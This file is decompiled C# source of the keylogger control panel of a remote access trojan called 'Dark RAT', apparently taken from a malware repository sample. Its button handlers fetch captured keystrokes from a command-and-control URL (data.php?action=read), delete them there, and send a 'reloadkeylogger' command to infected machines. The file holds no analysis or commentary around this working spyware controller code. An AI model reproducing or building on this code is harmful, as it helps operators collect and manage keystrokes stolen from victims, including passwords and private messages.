// Decompiled with JetBrains decompiler
// Type: Dark_RAT.keylogger
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class keylogger : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Button4")]
    private Button _Button4;
    [AccessedThroughProperty("Button5")]
    private Button _Button5;
    [AccessedThroughProperty("Button6")]
    private Button _Button6;

    [DebuggerNonUserCode]
    static keylogger()
    {
    }

    [DebuggerNonUserCode]
    public keylogger()
    {
      this.Load += new EventHandler(this.keylogger_Load);
      keylogger.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (keylogger.__ENCList)
      {
        if (keylogger.__ENCList.Count == keylogger.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (keylogger.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (keylogger.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                keylogger.__ENCList[index1] = keylogger.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          keylogger.__ENCList.RemoveRange(index1, checked (keylogger.__ENCList.Count - index1));
          keylogger.__ENCList.Capacity = keylogger.__ENCList.Count;
        }
        keylogger.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (keylogger));
      this.TextBox1 = new TextBox();
      this.Button4 = new Button();
      this.Button5 = new Button();
      this.Button6 = new Button();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(12, 12);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.ReadOnly = true;
      this.TextBox1.ScrollBars = ScrollBars.Vertical;
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(610, 229);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 1;
      this.Button4.Image = (Image) componentResourceManager.GetObject("Button4.Image");
      this.Button4.ImageAlign = ContentAlignment.MiddleLeft;
      Button button4_1 = this.Button4;
      point1 = new Point(12, 276);
      Point point3 = point1;
      button4_1.Location = point3;
      this.Button4.Name = "Button4";
      Button button4_2 = this.Button4;
      size1 = new Size(610, 23);
      Size size3 = size1;
      button4_2.Size = size3;
      this.Button4.TabIndex = 9;
      this.Button4.Text = "DELETE";
      this.Button4.UseVisualStyleBackColor = true;
      this.Button5.Image = (Image) componentResourceManager.GetObject("Button5.Image");
      this.Button5.ImageAlign = ContentAlignment.MiddleLeft;
      Button button5_1 = this.Button5;
      point1 = new Point(321, 247);
      Point point4 = point1;
      button5_1.Location = point4;
      this.Button5.Name = "Button5";
      Button button5_2 = this.Button5;
      size1 = new Size(301, 23);
      Size size4 = size1;
      button5_2.Size = size4;
      this.Button5.TabIndex = 8;
      this.Button5.Text = "GET";
      this.Button5.UseVisualStyleBackColor = true;
      this.Button6.Image = (Image) componentResourceManager.GetObject("Button6.Image");
      this.Button6.ImageAlign = ContentAlignment.MiddleLeft;
      Button button6_1 = this.Button6;
      point1 = new Point(12, 247);
      Point point5 = point1;
      button6_1.Location = point5;
      this.Button6.Name = "Button6";
      Button button6_2 = this.Button6;
      size1 = new Size(301, 23);
      Size size5 = size1;
      button6_2.Size = size5;
      this.Button6.TabIndex = 7;
      this.Button6.Text = "REQUEST";
      this.Button6.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(634, 310);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Button4);
      this.Controls.Add((Control) this.Button5);
      this.Controls.Add((Control) this.Button6);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.Name = nameof (keylogger);
      this.Text = "Keylogger";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual Button Button4
    {
      [DebuggerNonUserCode] get => this._Button4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button4_Click);
        if (this._Button4 != null)
          this._Button4.Click -= eventHandler;
        this._Button4 = value;
        if (this._Button4 == null)
          return;
        this._Button4.Click += eventHandler;
      }
    }

    internal virtual Button Button5
    {
      [DebuggerNonUserCode] get => this._Button5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button5_Click);
        if (this._Button5 != null)
          this._Button5.Click -= eventHandler;
        this._Button5 = value;
        if (this._Button5 == null)
          return;
        this._Button5.Click += eventHandler;
      }
    }

    internal virtual Button Button6
    {
      [DebuggerNonUserCode] get => this._Button6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button6_Click);
        if (this._Button6 != null)
          this._Button6.Click -= eventHandler;
        this._Button6 = value;
        if (this._Button6 == null)
          return;
        this._Button6.Click += eventHandler;
      }
    }

    private void Button1_Click(object sender, EventArgs e) => this.TextBox1.Text = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/keylogger/data.php?action=read");

    private void Button3_Click(object sender, EventArgs e)
    {
    }

    private void Button4_Click(object sender, EventArgs e) => new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/keylogger/data.php?action=delete");

    private void Button6_Click(object sender, EventArgs e) => MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|reloadkeylogger|"));

    private void Button5_Click(object sender, EventArgs e) => this.TextBox1.Text = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/keylogger/data.php?action=read");

    private void keylogger_Load(object sender, EventArgs e)
    {
    }
  }
}
